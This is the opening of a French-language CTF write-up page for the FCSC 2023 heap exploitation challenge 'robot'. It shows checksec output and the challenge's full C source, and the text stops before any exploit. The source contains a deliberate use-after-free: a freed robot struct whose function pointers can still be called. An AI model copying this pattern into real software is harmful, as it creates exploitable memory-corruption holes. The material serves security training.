@@ -1,0 +1,892 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:conflict]">
+<meta name="description" content="500 pts -&gt; 310 pts" />
+<meta name="keywords" content="cybersecurity blog french hacking rami malek, pwn, heap, gdb" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/posts/2023/04/fcsc-2023-pwn/robot/" />
+
+
+    <title>
+        
+            🇫🇷 FCSC 2023 - pwn/robot :: conflict  — cybersecurity blog
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.244183cde1a38e0b08f82c11791181288f9aac1cc9618cd6f4e9e7710c5768ba.css" integrity="sha256-JEGDzeGjjgsI&#43;CwReRGBKI&#43;arBzJYYzW9OnncQxXaLo=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="🇫🇷 FCSC 2023 - pwn/robot">
+  <meta itemprop="description" content="500 pts -&gt; 310 pts">
+  <meta itemprop="datePublished" content="2023-04-30T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2023-04-30T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2197">
+  <meta itemprop="image" content="/">
+  <meta itemprop="keywords" content="Pwn,Heap,Gdb">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="/">
+  <meta name="twitter:title" content="🇫🇷 FCSC 2023 - pwn/robot">
+  <meta name="twitter:description" content="500 pts -&gt; 310 pts">
+
+
+
+    <meta property="og:url" content="/posts/2023/04/fcsc-2023-pwn/robot/">
+  <meta property="og:site_name" content="conflict">
+  <meta property="og:title" content="🇫🇷 FCSC 2023 - pwn/robot">
+  <meta property="og:description" content="500 pts -&gt; 310 pts">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-04-30T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-04-30T00:00:00+00:00">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Heap">
+    <meta property="article:tag" content="Gdb">
+    <meta property="og:image" content="/">
+
+
+
+
+
+
+    <meta property="article:published_time" content="2023-04-30 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">-</span>
+            <span class="logo__text ">
+                cnf409</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#527ea9;
+                   animation-duration:0.8s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/contact/">Contact</a></li><li><a href="/htb/">HackTheBox</a></li><li><a href="/posts/">Posts</a></li><li><a href="/series/">Series</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        11 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="/posts/2023/04/fcsc-2023-pwn/robot/">🇫🇷 FCSC 2023 - pwn/robot</a>
+      </h1>
+
+      
+        <div class="post-excerpt">500 pts -&gt; 310 pts</div>
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h2 id="note">Note</h2>
+<p><em>robot</em> était un challenge de pwn issu du <strong>FCSC 2023</strong>. Globalement un très bon challenge, et surtout une très bonne initiation à l&rsquo;exploitation <em>heap</em> puisque je n&rsquo;en avais jamais fait !</p>
+<h2 id="description">Description</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>La startup _FunWithRobots &amp; Co._ souhaite proposer un service interactif, qui tourne sur un serveur distant et qui simule un robot avec beaucoup de réalisme. 
+</span></span><span style="display:flex;"><span>Mais la veille de l&#39;inauguration, le chef de projet se souvient d&#39;une vague mention concernant des exigences de sécurité...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Comme vous êtes la personne chargée de la sécurité, il a besoin de votre validation.
+</span></span><span style="display:flex;"><span>Selon lui, cela n&#39;est qu&#39;une simple formalité car le code a été relu par leurs meilleurs développeurs et le binaire s&#39;exécute avec toutes les protections classiques (canaris, W^X, ASLR, etc.).
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Vérifiez s&#39;il est possible de lire le fichier `flag.txt` qui se trouve sur le serveur distant.
+</span></span></code></pre></div><p><a href="https://france-cybersecurity-challenge.fr/files/069ca7f147eb771e02814586cfa94514/robot"><code>robot</code></a>, <a href="https://france-cybersecurity-challenge.fr/files/323d5aa30fc1f647e4d60019a74b3dde/robot.c"><code>robot.c</code></a></p>
+<h2 id="analyse-du-fichier">Analyse du fichier</h2>
+<p>On peut commencer par regarder rapidement à quoi on s&rsquo;attaque grâce aux commandes <em>file</em> et <em>checksec</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>file robot <span style="color:#f92672">&amp;&amp;</span> checksec robot
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>robot: ELF <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit LSB pie executable, x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span>, version <span style="color:#ae81ff">1</span> (SYSV), dynamically linked, interpreter <span style="color:#f92672">/</span>lib64<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64.</span>so<span style="color:#ae81ff">.2</span>, BuildID[sha1]<span style="color:#f92672">=</span>b1bb8d94563bab30f6fe505e4a7220d51f68c5aa, <span style="color:#66d9ef">for</span> GNU<span style="color:#f92672">/</span>Linux <span style="color:#ae81ff">3.2.0</span>, <span style="color:#f92672">not</span> stripped
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Arch:     amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
+</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
+</span></span><span style="display:flex;"><span>    Stack:    Canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
+</span></span></code></pre></div><p>On voit donc qu&rsquo;on va s&rsquo;attaquer à un <em>ELF</em> en <em>64 bits</em> protégé par toutes les protections (comme dit dans la desc).</p>
+<p>On va le run pour avoir une idée de ce qu&rsquo;il fait:</p>
+<p><img alt="2023-05-01-191537_656x191_scrot" src="https://user-images.githubusercontent.com/77807503/235506504-7fc953da-3707-4499-b570-08c3526eec6e.png"></p>
+<p>On a plusieurs options, mais on peut les rassembler en 3 catégories:</p>
+<ul>
+<li>Les options <strong>1</strong> et <strong>4</strong> vont a priori nous permettre d&rsquo;allouer des chunks (via <em>malloc</em>) pour créer le robot et le mode d&rsquo;emploi</li>
+<li>Les options <strong>2</strong> et <strong>5</strong> vont afficher le contenu d&rsquo;un chunk qu&rsquo;on aura crée au préalable, ça nous sera probablement utile pour leak des adresses</li>
+<li>Les options <strong>3</strong> et <strong>6</strong> vont respectivement nous permettre de supprimer un chunk (via <em>free</em>) et d&rsquo;appeller la fonction <code>admin</code></li>
+</ul>
+<p>Maintenant qu&rsquo;on sait ça, on va regarder un peu le code source pour tenter de trouver une vuln et de vérifier nos hypothèses:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;openssl/sha.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ctype.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;signal.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define TIMEOUT       120 </span><span style="color:#75715e">// in seconds
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> encrypted[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;8f75456b574439e191ae14f3e95a80a881a7216c2ac69b9c342aa62f8a048e0e&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> Robot {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">16</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>makeNoise)();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>move)();
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> RobotUserGuide {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> guide[<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">timeout</span>(<span style="color:#66d9ef">int</span> sig)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">bleep</span>(<span style="color:#66d9ef">struct</span> Robot <span style="color:#f92672">*</span>d)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">3</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Bip !&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">usleep</span> (<span style="color:#ae81ff">500000</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;La discussion avec %s est un peu ennuyeuse...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, d<span style="color:#f92672">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">roll</span>(<span style="color:#66d9ef">struct</span> Robot <span style="color:#f92672">*</span>d)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;%s se déplace en grinçant !</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, d<span style="color:#f92672">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">newRobot</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Vous construisez un nouveau robot. %s est un très joli nom pour un robot !</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> Robot <span style="color:#f92672">*</span>newrobot <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span> (<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> Robot));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strncpy</span> (newrobot<span style="color:#f92672">-&gt;</span>name, s, <span style="color:#ae81ff">15</span>);
+</span></span><span style="display:flex;"><span>    newrobot<span style="color:#f92672">-&gt;</span>makeNoise <span style="color:#f92672">=</span> bleep;
+</span></span><span style="display:flex;"><span>    newrobot<span style="color:#f92672">-&gt;</span>move <span style="color:#f92672">=</span> roll;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>) newrobot;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">admin</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pwd)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> hash[SHA256_DIGEST_LENGTH];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span>    result[<span style="color:#ae81ff">65</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SHA256</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) pwd, <span style="color:#a6e22e">strlen</span>(pwd), hash);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> SHA256_DIGEST_LENGTH; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sprintf</span>(result <span style="color:#f92672">+</span> (i <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>), <span style="color:#e6db74">&#34;%02x&#34;</span>, hash[i]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(result, encrypted) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">execl</span>(<span style="color:#e6db74">&#34;/bin/cat&#34;</span>, <span style="color:#e6db74">&#34;/bin/cat&#34;</span>, <span style="color:#e6db74">&#34;flag.txt&#34;</span>, NULL);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;execl&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;ERROR: wrong password!&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> Robot  <span style="color:#f92672">*</span>robot <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> RobotUserGuide <span style="color:#f92672">*</span>userGuide <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> ordre <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">64</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Install challenge timeout
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">signal</span>(SIGALRM, timeout);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">alarm</span>(TIMEOUT);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Menu */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Que faites-vous ?&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;1: Construire un robot</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">4: Rédiger le mode d&#39;emploi&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;2: Le faire parler</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">5: Afficher le mode d&#39;emploi&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;3: Jouer avec le robot</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">6: Admin&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;0: Quitter&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Ordre */</span>
+</span></span><span style="display:flex;"><span>        ordre <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>) <span style="color:#a6e22e">getc</span> (stdin);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ordre <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">getc</span> (stdin); <span style="color:#75715e">/* Enlève \n */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Exécution de l&#39;ordre */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> (ordre) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Comment vous l&#39;appelez ?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fgets</span> (input, <span style="color:#ae81ff">64</span>, stdin);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (input[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>)
+</span></span><span style="display:flex;"><span>                        input[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                robot <span style="color:#f92672">=</span> <span style="color:#a6e22e">newRobot</span>(input);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;2&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (robot)
+</span></span><span style="display:flex;"><span>                    robot<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">makeNoise</span>(robot);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Vous n&#39;avez pas de robot !&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;3&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (robot) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Vous allumez le robot. &#34;</span>);
+</span></span><span style="display:flex;"><span>                    robot<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">move</span>(robot);
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;De la fumée commence à apparaître, puis des étincelles... %s prend feu !!!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, robot<span style="color:#f92672">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;%s est complètement détruit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, robot<span style="color:#f92672">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">free</span> (robot);
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Vous n&#39;avez pas de robot !&#34;</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;4&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                userGuide <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span> (<span style="color:#66d9ef">sizeof</span> (<span style="color:#66d9ef">struct</span> RobotUserGuide));
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Vous commencez à rédiger le mode d&#39;emploi...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fgets</span> (userGuide<span style="color:#f92672">-&gt;</span>guide, <span style="color:#ae81ff">32</span>, stdin);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;5&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (userGuide) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">char</span> c <span style="color:#f92672">=</span> userGuide<span style="color:#f92672">-&gt;</span>guide[i];
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">putchar</span> (c);
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">fflush</span> (stdout);
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Il n&#39;y a pas de mode d&#39;emploi&#34;</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;6&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Enter admin password</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fgets</span> (input, <span style="color:#ae81ff">64</span>, stdin);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (input[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>)
+</span></span><span style="display:flex;"><span>                        input[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">admin</span> (input);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Au revoir !&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">exit</span> (<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Commande non reconnue&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">putchar</span> (<span style="color:#e6db74">&#39;\n&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
